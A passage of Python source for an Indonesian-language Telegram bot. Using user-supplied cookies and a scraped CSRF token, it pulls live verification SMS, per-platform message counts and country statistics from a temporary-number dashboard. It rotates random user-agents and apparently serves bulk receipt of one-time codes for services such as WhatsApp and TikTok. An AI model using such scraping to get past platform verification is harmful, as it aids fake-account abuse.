        response = session.get(NUMBERS_PAGE_URL, timeout=15)
        if response.status_code == 200:
            
            match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
            if match:
                return match.group(1)
            
            
            match = re.search(r'X-CSRF-TOKEN["\s:]+"([^"]+)"', response.text)
            if match:
                return match.group(1)
        return None
    except Exception as e:
        print(f"Error refresh CSRF: {e}")
        return None
    
async def nomor_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /nomor"""
    if not is_allowed_user(update.effective_user.id):
        return
    user_id = update.effective_user.id
    
    if not check_user_login(user_id):
        await update.message.reply_text(
            _build(TEMPLATE_ERROR, 'GAGAL', message="Kamu belum login! Gunakan /cookies dulu."),
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    await update.message.reply_text(
        _build(TEMPLATE_EXPORT, 'EXPORT DAFTAR NOMOR'),
        parse_mode=ParseMode.HTML,
        reply_markup=get_export_keyboard(user_id)
    )

async def top_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /top - Lihat negara paling aktif di WhatsApp"""
    if not is_allowed_user(update.effective_user.id):
        return
    try:
        user_id = update.effective_user.id
        
        msg = await update.message.reply_text(
            f"{em(CE_LOADING,'🟠')} <i>Mengambil data negara aktif...</i>",
            parse_mode=ParseMode.HTML
        )
        
        
        loop = asyncio.get_event_loop()
        success, result = await bg.run(user_id, fetch_top_countries)
        
        if not success:
            await msg.edit_text(
                f"{em(E2, '⭐')} <b>GAGAL</b>\n\n{result}",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        total, countries = result
        
        
        countries_text = ""
        for i, country in enumerate(countries[:10], 1):  
            flag = get_country_flag(country['country'])
            count = country['count']
            country_name = country['country'][:14]
            
            max_count = countries[0]['count'] if countries else 1
            bar_length = int((count / max_count) * 5)
            bar = "█" * bar_length + "░" * (5 - bar_length)
            
            countries_text += f"<code>[{i:02d}]</code> {flag} <code>{country_name:<14} {bar} {count:>4}</code>\n"
        
        text = f"""{em(E5,'🏴‍☠️')} <b>SYSTEM SCAN</b>
━━━━━━━━━━━━━━━━━━━━━━
 <code>███████████████ 100%</code>

 {em(E1,'⭐')} <b>Status</b>: Connected
 {em(E2,'⭐')} <b>Data</b>: {total} active countries

{em(E4,'🎧')} <b>LIVE TOP 10 DATA</b>
━━━━━━━━━━━━━━━━━━━━━━
{countries_text}━━━━━━━━━━━━━━━━━━━━━━
{em(E4,'🎧')} <i>Powered by DikZz</i>"""
        
        await msg.edit_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(" REFRESH", callback_data=f"top_refresh_{user_id}", icon_custom_emoji_id="5870903672937911120", style="primary"),
                InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
            ]])
        )
        
    except Exception as e:
        logger.error(f"Error top_command: {e}")
        await update.message.reply_text(
            f" Error: {str(e)[:100]}",
            reply_markup=get_back_keyboard(update.effective_user.id)
        )


def fetch_top_countries():
    """Fetch data dari API"""
    try:
        url = "https://ws.websocket.web.id/api/cekivas?platform=whatsapp"
        
        headers = {
            'User-Agent': get_random_user_agent()
        }
        
        response = requests.get(url, headers=headers, timeout=15)
        
        if response.status_code != 200:
            return False, f"HTTP Error: {response.status_code}"
        
        data = response.json()
        
        if not data.get('success'):
            return False, data.get('message', 'Unknown error')
        
        total = data.get('total_found', 0)
        results = data.get('results', [])
        
        
        results.sort(key=lambda x: x.get('count', 0), reverse=True)
        
        return True, (total, results)
        
    except requests.exceptions.Timeout:
        return False, "Timeout koneksi ke server"
    except requests.exceptions.ConnectionError:
        return False, "Gagal koneksi ke server"
    except json.JSONDecodeError:
        return False, "Response tidak valid dari server"
    except Exception as e:
        return False, str(e)


_FLAG: dict[str, tuple[str, str]] = {
    'UA': ('5222250679371839695', '🇺🇦'),
    'US': ('5224321781321442532', '🇺🇸'),
    'PL': ('5224670399521892983', '🇵🇱'),
    'KZ': ('5222276376161171525', '🇰🇿'),
    'AZ': ('5224426544163728284', '🇦🇿'),
    'EU': ('5222108911091331711', '🇪🇺'),
    'UN': ('5451772687993031127', '🇺🇳'),
    'AM': ('5224369957969603463', '🇦🇲'),
    'RU': ('5280582975270963511', '🇷🇺'),
    'CN': ('5224435456220868088', '🇨🇳'),
    'UZ': ('5222404546575219535', '🇺🇿'),
    'DE': ('5222165617544542414', '🇩🇪'),
    'JP': ('5222390089715299207', '🇯🇵'),
    'TR': ('5224601903383457698', '🇹🇷'),
    'BY': ('5280820319458707404', '🇧🇾'),
    'GB': ('5224518800061245598', '🇬🇧'),
    'IN': ('5222300011366200403', '🇮🇳'),
    'BR': ('5224688610183228070', '🇧🇷'),
    'ZM': ('5224646626877911277', '🇿🇲'),
    'YE': ('5222300655611294950', '🇾🇪'),
    'GB-WLS': ('5224431333052264232', '🏴'),
    'VI': ('5224395882392201810', '🇻🇮'),
    'VN': ('5222359651282071925', '🇻🇳'),
    'VA': ('5222420266155520507', '🇻🇦'),
    'VU': ('5222126748090512778', '🇻🇺'),
    'UY': ('5222466849370813232', '🇺🇾'),
    'AE': ('5224565851427976312', '🇦🇪'),
    'UG': ('5222464040462200940', '🇺🇬'),
    'TM': ('5224256935905208951', '🇹🇲'),
    'TN': ('5221991375016310330', '🇹🇳'),
    'TT': ('5224391883777651050', '🇹🇹'),
    'TG': ('5222408051268532030', '🇹🇬'),
    'TH': ('5224638530864556281', '🇹🇭'),
    'TZ': ('5224397364155923150', '🇹🇿'),
    'TJ': ('5222217865821696536', '🇹🇯'),
    'CH': ('5224707263226194753', '🇨🇭'),
    'SE': ('5222201098269373561', '🇸🇪'),
    'SZ': ('5224269666188274723', '🇸🇿'),
    'SR': ('5224567367551428669', '🇸🇷'),
    'SD': ('5224372990216514135', '🇸🇩'),
    'ES': ('5222024776976970940', '🇪🇸'),
    'LK': ('5224277294050192388', '🇱🇰'),
    'SS': ('5224618146949773268', '🇸🇸'),
    'KR': ('5222345550904439270', '🇰🇷'),
    'ZA': ('5224696216570309138', '🇿🇦'),
    'SO': ('5222370504664428325', '🇸🇴'),
    'SB': ('5222290588207954120', '🇸🇧'),
    'SI': ('5224660718665607511', '🇸🇮'),
    'SK': ('5222401879400528047', '🇸🇰'),
    'SG': ('5224194023224257181', '🇸🇬'),
    'SL': ('5224420995065983217', '🇸🇱'),
    'SC': ('5224467496676896871', '🇸🇨'),
    'RS': ('5222145396838512729', '🇷🇸'),
    'SN': ('5224358988623130949', '🇸🇳'),
    'GB-SCT': ('5224580312582861623', '🏴'),
    'SA': ('5224698145010624573', '🇸🇦'),
    'WS': ('5224660353593387686', '🇼🇸'),
    'VC': ('5224541228380467535', '🇻🇨'),
    'LC': ('5222000927023577045', '🇱🇨'),
    'PS': ('5222041677673282461', '🇵🇸'),
    'RW': ('5222449197055227754', '🇷🇼'),
    'RO': ('5222273794885826118', '🇷🇴'),
    'QA': ('5222225596762830469', '🇶🇦'),
    'PR': ('5224220115150582423', '🇵🇷'),
    'PT': ('5224404094369672274', '🇵🇹'),
    'NG': ('5224723614166691638', '🇳🇬'),
    'NO': ('5224465228934163949', '🇳🇴'),
    'OM': ('5222396686785066306', '🇴🇲'),
    'PK': ('5224637061985742245', '🇵🇰'),
    'PA': ('5222111719999945107', '🇵🇦'),
    'PG': ('5224500164198149905', '🇵🇬'),
    'PY': ('5222152565138929235', '🇵🇾'),
    'PE': ('5224482026551258766', '🇵🇪'),
    'PH': ('5222065042295376892', '🇵🇭'),
    'NE': ('5222099049846420864', '🇳🇪'),
    'NZ': ('5224573595254009705', '🇳🇿'),
    'NL': ('5224516489368841614', '🇳🇱'),
    'NP': ('5222444378101925267', '🇳🇵'),
    'NA': ('5224690826386351746', '🇳🇦'),
    'MZ': ('5222470388423864826', '🇲🇿'),
    'MA': ('5224530035695693965', '🇲🇦'),
    'ME': ('5224463399278096980', '🇲🇪'),
    'MN': ('5224192257992701543', '🇲🇳'),
    'MC': ('5221937224068640464', '🇲🇨'),
    'MV': ('5224393700548814960', '🇲🇻'),
    'ML': ('5224322352552096671', '🇲🇱'),
    'MT': ('5224731388057497620', '🇲🇹'),
    'BM': ('5222482143749353810', '🇧🇲'),
    'MH': ('5224538449536624503', '🇲🇭'),
    'MU': ('5224238347286752315', '🇲🇺'),
    'MR': ('5224238347286752315', '🇲🇷'),
    'MX': ('5221971386238514431', '🇲🇽'),
    'FM': ('5222280486444873367', '🇫🇲'),
    'MD': ('5224216473018314447', '🇲🇩'),
    'MY': ('5224312886444174057', '🇲🇾'),
    'KE': ('5222089648163009103', '🇰🇪'),
    'MG': ('5222042605386217334', '🇲🇬'),
    'MK': ('5222470435668505656', '🇲🇰'),
    'LU': ('5224499567197700690', '🇱🇺'),
    'LT': ('5224245902134226386', '🇱🇹'),
    'LY': ('5222194286451242896', '🇱🇾'),
    'LR': ('5221998371518034740', '🇱🇷'),
    'LS': ('5224245850594619415', '🇱🇸'),
    'LB': ('5222244425899455269', '🇱🇧'),
    'IE': ('5224257017509588818', '🇮🇪'),
    'JM': ('5222007034467074185', '🇯🇲'),
    'JO': ('5222292177345853436', '🇯🇴'),
    'KI': ('5224652244695134610', '🇰🇮'),
    'XK': ('5222197129719592160', '🇽🇰'),
    'KW': ('5221949726718442491', '🇰🇼'),
    'KG': ('5224388147156102493', '🇰🇬'),
    'LA': ('5224200843632324642', '🇱🇦'),
    'LV': ('5224401229626484931', '🇱🇻'),
    'IT': ('5222460101977190141', '🇮🇹'),
    'IL': ('5224720599099648709', '🇮🇱'),
    'IQ': ('5221980268230882832', '🇮🇶'),
    'IR': ('5224374154152653367', '🇮🇷'),
    'ID': ('5224405893960969756', '🇮🇩'),
    'IS': ('5222063229819172521', '🇮🇸'),
    'HU': ('5224691998912427164', '🇭🇺'),
    'HN': ('5222229234600130045', '🇭🇳'),
    'HT': ('5224683146984831315', '🇭🇹'),
    'GA': ('5224669733801963467', '🇬🇦'),
    'GM': ('5221949872747330159', '🇬🇲'),
    'GE': ('5222152195771742239', '🇬🇪'),
    'GH': ('5224511339703056124', '🇬🇭'),
    'GR': ('5222463490706389920', '🇬🇷'),
    'GD': ('5222234560359577687', '🇬🇩'),
    'GT': ('5222128302868672826', '🇬🇹'),
    'GN': ('5222337588035073000', '🇬🇳'),
    'GW': ('5224705704153066489', '🇬🇼'),
    'GY': ('5224570532942329532', '🇬🇾'),
    'FR': ('5222029789203804982', '🇫🇷'),
    'FI': ('5224282903277482188', '🇫🇮'),
    'FJ': ('5221962676044838178', '🇫🇯'),
    'ET': ('5224467805914542024', '🇪🇹'),
    'EE': ('5222195463272281351', '🇪🇪'),
    'GQ': ('5222172811614762423', '🇬🇶'),
    'GB-ENG': ('5224402728570071579', '🏴'),
    'SV': ('5224337131534559907', '🇸🇻'),
    'EG': ('5222161185138292290', '🇪🇬'),
    'CG': ('5222104268231684600', '🇨🇬'),
    'CR': ('5222453801260168022', '🇨🇷'),
    'HR': ('5221967765581085099', '🇭🇷'),
    'CY': ('5222431454545327055', '🇨🇾'),
    'DK': ('5222297215342490217', '🇩🇰'),
    'DJ': ('5224203012590810589', '🇩🇯'),
    'DM': ('5222337489250824921', '🇩🇲'),
    'DO': ('5224286412265763450', '🇩🇴'),
    'TL': ('5224515905253291409', '🇹🇱'),
    'EC': ('5224191188545840926', '🇪🇨'),
    'CD': ('5224398158724871677', '🇨🇩'),
    'KM': ('5222398735484466247', '🇰🇲'),
    'CO': ('5224455152940886669', '🇨🇴'),
    'CL': ('5222350726340032308', '🇨🇱'),
    'CZ': ('5222073533445714675', '🇨🇿'),
    'TD': ('5222060468155204001', '🇹🇩'),
    'CF': ('5222073662294733523', '🇨🇫'),
    'CV': ('5222347737042792258', '🇨🇻'),
    'CA': ('5222001124592071204', '🇨🇦'),
    'CM': ('5222270788408717651', '🇨🇲'),
    'BJ': ('5222024115552009151', '🇧🇯'),
    'BT': ('5224541065171710147', '🇧🇹'),
    'BO': ('5224675484763170798', '🇧🇴'),
    'BA': ('5224496092569155254', '🇧🇦'),
    'BW': ('5224288456670196085', '🇧🇼'),
    'BN': ('5224435958732042406', '🇧🇳'),
    'BG': ('5222092074819530668', '🇧🇬'),
    'BF': ('5222356541725749790', '🇧🇫'),
    'BI': ('5224490444687158452', '🇧🇮'),
    'KH': ('5224189882875785448', '🇰🇭'),
    'BZ': ('5224316292353241916', '🇧🇿'),
    'BE': ('5224513182244024630', '🇧🇪'),
    'BB': ('5222156533688712094', '🇧🇧'),
    'BD': ('5224407289825340729', '🇧🇩'),
    'BH': ('5224492892818518587', '🇧🇭'),
    'BS': ('5224504167107668172', '🇧🇸'),
    'AT': ('5224520754271366661', '🇦🇹'),
    'AU': ('5224659803837574114', '🇦🇺'),
    'AR': ('5221980461504411710', '🇦🇷'),
    'AG': ('5224544866217765554', '🇦🇬'),
    'MQ': ('5281027792148909351', '🇲🇶'),
    'FO': ('5280985770188885026', '🇫🇴'),
    'ZW': ('5222060442385397848', '🇿🇼'),
    'AL': ('5224312057515486246', '🇦🇱'),
    'DZ': ('5224260376174015500', '🇩🇿'),
    'AD': ('5221987861733061751', '🇦🇩'),
    'AO': ('5224379767674907895', '🇦🇴'),
    'AF': ('5222096009009575868', '🇦🇫'),
    'VE': ('5294476442854247878', '🇻🇪'),
    'ST': ('5221953304426198315', '🇸🇹'),
    'CI': ('5411283953984218884', '🇨🇮'),
    'DEFAULT': ('5222206157740847357', '🏁'),
}

_NAME_TO_CODE: dict[str, str] = {
    'UKRAINE': 'UA', 'UNITED STATES': 'US', 'USA': 'US', 'KAZAKHSTAN': 'KZ',
    'AZERBAIJAN': 'AZ', 'EUROPEAN UNION': 'EU', 'UNITED NATIONS': 'UN',
    'ARMENIA': 'AM', 'RUSSIA': 'RU', 'CHINA': 'CN', 'GERMANY': 'DE',
    'JAPAN': 'JP', 'TURKEY': 'TR', 'BELARUS': 'BY', 'UNITED KINGDOM': 'GB',
    'INDIA': 'IN', 'BRAZIL': 'BR', 'ZAMBIA': 'ZM', 'YEMEN': 'YE',
    'WALES': 'GB-WLS', 'VIRGIN ISLANDS': 'VI', 'VIETNAM': 'VN',
    'VATICAN CITY': 'VA', 'VANUATU': 'VU', 'URUGUAY': 'UY',
    'UNITED ARAB EMIRATES': 'AE', 'SWITZERLAND': 'CH', 'TAJIKISTAN': 'TJ',
    'TANZANIA': 'TZ', 'THAILAND': 'TH', 'TOGO': 'TG',
    'TRINIDAD AND TOBAGO': 'TT', 'TUNISIA': 'TN', 'TURKMENISTAN': 'TM',
    'UGANDA': 'UG', 'SWEDEN': 'SE', 'ESWATINI': 'SZ', 'SURINAME': 'SR',
    'SUDAN': 'SD', 'SPAIN': 'ES', 'SRI LANKA': 'LK', 'SOUTH SUDAN': 'SS',
    'SOUTH KOREA': 'KR', 'SOUTH AFRICA': 'ZA', 'SOMALIA': 'SO',
    'SAUDI ARABIA': 'SA', 'SENEGAL': 'SN', 'SCOTLAND': 'GB-SCT',
    'SERBIA': 'RS', 'SEYCHELLES': 'SC', 'SIERRA LEONE': 'SL',
    'SINGAPORE': 'SG', 'SLOVAKIA': 'SK', 'SLOVENIA': 'SI',
    'SOLOMON ISLANDS': 'SB', 'SAO TOME AND PRINCIPE': 'ST', 'SAMOA': 'WS',
    'SAINT VINCENT AND THE GRENADINES': 'VC', 'CHILE': 'CL', 'RWANDA': 'RW',
    'QATAR': 'QA', 'PUERTO RICO': 'PR', 'PORTUGAL': 'PT', 'NIGERIA': 'NG',
    'NORWAY': 'NO', 'OMAN': 'OM', 'PAKISTAN': 'PK', 'PALESTINE': 'PS',
    'PANAMA': 'PA', 'PAPUA NEW GUINEA': 'PG', 'PARAGUAY': 'PY', 'PERU': 'PE',
    'PHILIPPINES': 'PH', 'NIGER': 'NE', 'MONACO': 'MC', 'MONGOLIA': 'MN',
    'NEW ZEALAND': 'NZ', 'MONTENEGRO': 'ME', 'MOROCCO': 'MA',
    'NETHERLANDS': 'NL', 'NEPAL': 'NP', 'MOZAMBIQUE': 'MZ', 'NAMIBIA': 'NA',
    'MOLDOVA': 'MD', 'MALDIVES': 'MV', 'MALTA': 'MT', 'MICRONESIA': 'FM',
    'BERMUDA': 'BM', 'MEXICO': 'MX', 'MAURITIUS': 'MU',
    'MARSHALL ISLANDS': 'MH', 'MALAYSIA': 'MY', 'LEBANON': 'LB',
    'LESOTHO': 'LS', 'KENYA': 'KE', 'LIBERIA': 'LR', 'LIBYA': 'LY',
    'MADAGASCAR': 'MG', 'NORTH MACEDONIA': 'MK', 'LITHUANIA': 'LT',
    'LUXEMBOURG': 'LU', 'ITALY': 'IT', 'HAITI': 'HT', 'HONDURAS': 'HN',
    'ISRAEL': 'IL', 'HUNGARY': 'HU', 'ICELAND': 'IS', 'INDONESIA': 'ID',
    'IRAN': 'IR', 'IRAQ': 'IQ', 'IRELAND': 'IE', 'GABON': 'GA',
    'GAMBIA': 'GM', 'GHANA': 'GH', 'GEORGIA': 'GE', 'GREECE': 'GR',
    'GRENADA': 'GD', 'GUATEMALA': 'GT', 'GUINEA': 'GN',
    'GUINEA-BISSAU': 'GW', 'GUYANA': 'GY', 'FRANCE': 'FR', 'FINLAND': 'FI',
    'FIJI': 'FJ', 'ETHIOPIA': 'ET', 'ESTONIA': 'EE',
    'EQUATORIAL GUINEA': 'GQ', 'ENGLAND': 'GB-ENG', 'EL SALVADOR': 'SV',
    'EGYPT': 'EG', 'CONGO': 'CG', 'COSTA RICA': 'CR', 'CROATIA': 'HR',
    'CYPRUS': 'CY', 'DENMARK': 'DK', 'DJIBOUTI': 'DJ', 'DOMINICA': 'DM',
    'DOMINICAN REPUBLIC': 'DO', 'TIMOR-LESTE': 'TL', 'ECUADOR': 'EC',
    'CONGO (DRC)': 'CD', 'COMOROS': 'KM', 'COLOMBIA': 'CO',
    'CZECH REPUBLIC': 'CZ', 'CHAD': 'TD', 'CENTRAL AFRICAN REPUBLIC': 'CF',
    'CABO VERDE': 'CV', 'CANADA': 'CA', 'CAMEROON': 'CM', 'BENIN': 'BJ',
    'BHUTAN': 'BT', 'ANTIGUA AND BARBUDA': 'AG', 'ARGENTINA': 'AR',
    'AUSTRALIA': 'AU', 'BOLIVIA': 'BO', 'BOSNIA AND HERZEGOVINA': 'BA',
    'AUSTRIA': 'AT', 'BOTSWANA': 'BW', 'BAHAMAS': 'BS', 'ZIMBABWE': 'ZW',
    'BRUNEI': 'BN', 'BAHRAIN': 'BH', 'AFGHANISTAN': 'AF', 'BULGARIA': 'BG',
    'BANGLADESH': 'BD', 'ALBANIA': 'AL', 'BURKINA FASO': 'BF',
    'BARBADOS': 'BB', 'ALGERIA': 'DZ', 'BURUNDI': 'BI', 'BELGIUM': 'BE',
    'ANDORRA': 'AD', 'CAMBODIA': 'KH', 'BELIZE': 'BZ', 'ANGOLA': 'AO',
    'KYRGYZSTAN': 'KG', 'KUWAIT': 'KW', 'JORDAN': 'JO', 'JAMAICA': 'JM',
    'NORTH KOREA': 'KP', 'KIRIBATI': 'KI', 'LAOS': 'LA',
    'LIECHTENSTEIN': 'LI', 'LATVIA': 'LV', 'MYANMAR': 'MM',
    'MAURITANIA': 'MR', 'MALAWI': 'MW', 'MALI': 'ML', 'NICARAGUA': 'NI',
    'NAURU': 'NR', 'POLAND': 'PL', 'PALAU': 'PW', 'ROMANIA': 'RO',
    'SAN MARINO': 'SM', 'SYRIA': 'SY', 'TONGA': 'TO', 'TUVALU': 'TV',
    'TAIWAN': 'TW', 'UZBEKISTAN': 'UZ', 'VENEZUELA': 'VE', 'KOSOVO': 'XK',
    'WESTERN SAHARA': 'EH', 'IVORY COAST': 'CI', "COTE D'IVOIRE": 'CI',
    'CUBA': 'CU', 'ERITREA': 'ER',
}


def get_country_flag(country_name: str) -> str:
    """Return custom tg-emoji flag jika ID ada, fallback ke Unicode emoji."""
    code = _NAME_TO_CODE.get(country_name.upper())
    if not code:
        return ''
    entry = _FLAG.get(code)
    if not entry:
        return ''
    emoji_id, fallback = entry
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def get_flag_custom_emoji_id(country_or_range_name: str) -> str:
    """Return custom tg-emoji ID string for a country/range name, fallback to DEFAULT flag ID."""
    if not country_or_range_name:
        return _FLAG['DEFAULT'][0]
    
    val = country_or_range_name.strip().upper().replace('_', ' ')
    
    # Check if direct match in _NAME_TO_CODE
    code = _NAME_TO_CODE.get(val)
    if code and code in _FLAG:
        return _FLAG[code][0]
        
    # Check if country name is a prefix/substring or contained
    for country_name, code in _NAME_TO_CODE.items():
        if country_name in val or val in country_name:
            if code in _FLAG:
                return _FLAG[code][0]
                
    # Fallback to word splitting
    words = val.split()
    for word in words:
        code = _NAME_TO_CODE.get(word)
        if code and code in _FLAG:
            return _FLAG[code][0]
        for country_name, code in _NAME_TO_CODE.items():
            if word == country_name or word in country_name:
                if code in _FLAG:
                    return _FLAG[code][0]
                    
    return _FLAG['DEFAULT'][0]

async def all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /all - Tampilkan semua platform aktif dan jumlah message"""
    if not is_allowed_user(update.effective_user.id):
        return
    
    user_id = update.effective_user.id
    
    
    if not check_user_login(user_id):
        await update.message.reply_text(
            " Kamu belum login! Gunakan /cookies dulu.",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    msg = await update.message.reply_text(
        f"{em(CE_LOADING,'🟠')} <i>Mengambil data platform...</i>",
        parse_mode=ParseMode.HTML
    )
    
    
    _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
    
    if not logged_in or not cookies_dict:
        await msg.edit_text(
            f"{em(E2,'⭐')} Session expired! Silahkan login ulang.",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    
    session = requests.Session()
    for key, value in cookies_dict.items():
        session.cookies.set(key, value)
    
    
    success, data = await bg.run(user_id, fetch_all_platforms_with_session, session, True)
    
    if not success:
        await msg.edit_text(
            f"{em(E2, '⭐')} <b>GAGAL MENGAMBIL DATA</b>\n\n{data}",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    if not data:
        await msg.edit_text(
            f"📭 <b>TIDAK ADA DATA</b>\n\nTidak ada platform ditemukan.",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    total_messages = sum(p['count'] for p in data)
    
    text = f"""{em(E5,'🏴‍☠️')} <b>TOP 10 PLATFORM AKTIF</b>
━━━━━━━━━━━━━━━━━━━━━━
{em(E1,'⭐')} <b>Sumber</b>: iVASMS Dashboard
{em(E2,'⭐')} <b>Total</b>: {total_messages:,} message
━━━━━━━━━━━━━━━━━━━━━━

"""
    
    for i, platform in enumerate(data[:10], 1):
        emoji = get_platform_emoji(platform['name'])
        count_str = f"{platform['count']:,}"
        text += f"{em(E2,'⭐')} <b>{i}.</b> {emoji} {platform['name']}\n"
        text += f"     {em(CE_LOADING,'🟠')} <code>{count_str} message</code>\n\n"
    
    text += f"━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"{em(E4,'🎧')} <i>Powered by DikZz</i>"
    
    await msg.edit_text(
        text,
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton(" REFRESH", callback_data=f"all_refresh_{user_id}", icon_custom_emoji_id="5870903672937911120", style="primary"),
            InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
        ]])
    )
    
def fetch_all_platforms_with_session(session, use_cache=True):
    """Fetch semua platform dari dashboard iVASMS - DENGAN CACHE"""
    
    cache_key = "all_platforms"
    
    
    if use_cache:
        cached = platform_cache.get(cache_key)
        if cached:
            print("[CACHE] Mengambil data platform dari cache")
            return True, cached
    
    try:
        url = "https://ivas.tempnum.qzz.io/portal"
        
        response = session.get(url, timeout=10)  
        
        if response.status_code != 200:
            return False, f"HTTP {response.status_code}"
        
        html = response.text
        platforms = []
        
        
        
        table_match = re.search(r'<div class="table-responsive d-none d-md-block">(.*?)</div>', html, re.DOTALL)
        
        if table_match:
            table_html = table_match.group(1)
            
            
            rows = re.findall(r'<td[^>]*>.*?<i[^>]*class="[^"]*fa-([a-z]+)[^"]*"[^>]*></i>.*?<p[^>]*>(.*?)</p>.*?<small[^>]*>([\d,]+)\s*message</small>', table_html, re.DOTALL)
            
            for icon, name, count_str in rows:
                name = name.strip().replace('*', '')
                if name and count_str:
                    try:
                        count = int(count_str.replace(',', ''))
                        platforms.append({'name': name, 'count': count})
                    except:
                        pass
        
        
        if not platforms:
            mobile_match = re.search(r'<div class="table-responsive d-block d-md-none">(.*?)</div>', html, re.DOTALL)
            if mobile_match:
                mobile_html = mobile_match.group(1)
                rows = re.findall(r'<td[^>]*>.*?<i[^>]*class="[^"]*fa-([a-z]+)[^"]*"[^>]*></i>.*?<p[^>]*>(.*?)</p>.*?<small[^>]*>([\d,]+)\s*message</small>', mobile_html, re.DOTALL)
                
                for icon, name, count_str in rows:
                    name = name.strip().replace('*', '')
                    existing = next((p for p in platforms if p['name'] == name), None)
                    if not existing and name and count_str:
                        try:
                            count = int(count_str.replace(',', ''))
                            platforms.append({'name': name, 'count': count})
                        except:
                            pass
        
        
        if not platforms:
            
            quick_patterns = [
                ('TikTok', r'TikTok.*?([\d,]+)\s*message'),
                ('WhatsApp', r'WhatsApp.*?([\d,]+)\s*message'),
                ('Facebook', r'Facebook.*?([\d,]+)\s*message'),
                ('TWVerify', r'TWVerify.*?([\d,]+)\s*message'),
                ('Apple', r'Apple.*?([\d,]+)\s*message'),
                ('Microsoft', r'Microsoft.*?([\d,]+)\s*message'),
                ('SHEIN', r'SHEIN.*?([\d,]+)\s*message'),
                ('Viber', r'Viber.*?([\d,]+)\s*message'),
                ('PayPal', r'PayPal.*?([\d,]+)\s*message'),
                ('Temu', r'Temu.*?([\d,]+)\s*message'),
            ]
            
            for name, pattern in quick_patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    try:
                        count = int(match.group(1).replace(',', ''))
                        platforms.append({'name': name, 'count': count})
                    except:
                        platforms.append({'name': name, 'count': 0})
        
        if not platforms:
            return False, "Tidak ada data platform ditemukan"
        
        
        platforms.sort(key=lambda x: x['count'], reverse=True)
        
        
        platform_cache.set(cache_key, platforms)
        
        return True, platforms
        
    except requests.exceptions.Timeout:
        return False, "Timeout - coba lagi"
    except Exception as e:
        return False, str(e)
    
def get_platform_emoji(platform_name):
    """Dapatkan emoji untuk setiap platform"""
    custom_emojis = {
        'TikTok': CE_TIKTOK,
        'WhatsApp': CE_WHATSAPP,
        'Telegram': CE_TELEGRAM,
        'Microsoft': CE_MICROSOFT,
        'Viber': CE_VIBER,
        'Facebook': CE_FACEBOOK,
    }
    if platform_name in custom_emojis:
        return em(custom_emojis[platform_name], '⭐')
    emojis = {
        'TWVerify': '',
        'Apple': '🍎',
        'SHEIN': '👗',
        'PayPal': '💙',
        'Temu': '🛒',
        'WATSONS': '🏪',
        'Max': '🎬',
        'Msport': '⚽',
        'VERIFY': '🔐',
        'DBSBank': '🏦',
        'GoChat': '💬',
        'AUTHMSG': '',
        'NCSOFT': '🎮',
        'TINDER': '',
        'Qsms': ''
    }
    return emojis.get(platform_name, '')





async def process_live_sms_background(msg, user_id, context=None):
    """Background process untuk live SMS - VERSION STABLE DENGAN LANGSUNG KIRIM RANGE_NAME"""

    try:
        
        _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
        
        if not logged_in or not cookies_dict or not csrf:
            await msg.edit_text(
                f"{em(E2,'⭐')} Session expired! Silahkan login ulang dengan /cookies",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        
        session = requests.Session()
        session.cookies.update(cookies_dict)
        session.headers.update({
            'User-Agent': session.headers.get('User-Agent', get_random_user_agent()),
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'application/json, text/plain, */*'
        })
        
        
        test_success = False
        for attempt in range(3):
            try:
                test = await bg.run(user_id, session.get, NUMBERS_PAGE_URL, timeout=12, allow_redirects=False)
                if test.status_code == 200:
                    test_success = True
                    break
                elif test.status_code == 302:
                    await msg.edit_text(
                        " Session tidak valid! Silahkan login ulang dengan /cookies",
                        parse_mode=ParseMode.HTML,
                        reply_markup=get_back_keyboard(user_id)
                    )
                    return
            except requests.exceptions.Timeout:
                if attempt == 2:
                    await msg.edit_text(
                        " Koneksi timeout! Coba lagi nanti",
                        parse_mode=ParseMode.HTML,
                        reply_markup=get_back_keyboard(user_id)
                    )
                    return
                await asyncio.sleep(1)
            except:
                if attempt == 2:
                    await msg.edit_text(
                        " Gagal koneksi ke server!",
                        parse_mode=ParseMode.HTML,
                        reply_markup=get_back_keyboard(user_id)
                    )
                    return
                await asyncio.sleep(1)
        
        if not test_success:
            return
        
        
        data = None
        for attempt in range(2):
            try:
                data = await asyncio.wait_for(
                    bg.run(user_id, fetch_live_sms, session, csrf, "", 15),
                    timeout=15
                )
                if data:
                    break
            except asyncio.TimeoutError:
                if attempt == 1:
                    await msg.edit_text(
                        " Server tidak merespon! Coba lagi",
                        parse_mode=ParseMode.HTML,
                        reply_markup=get_back_keyboard(user_id)
                    )
                    return
                await asyncio.sleep(1)
            except:
                if attempt == 1:
                    await msg.edit_text(
                        " Gagal mengambil data!",
                        parse_mode=ParseMode.HTML,
                        reply_markup=get_back_keyboard(user_id)
                    )
                    return
                await asyncio.sleep(1)
        
        if not data:
            await msg.edit_text(
                " Data kosong dari server!",
                parse_mode=ParseMode.HTML,
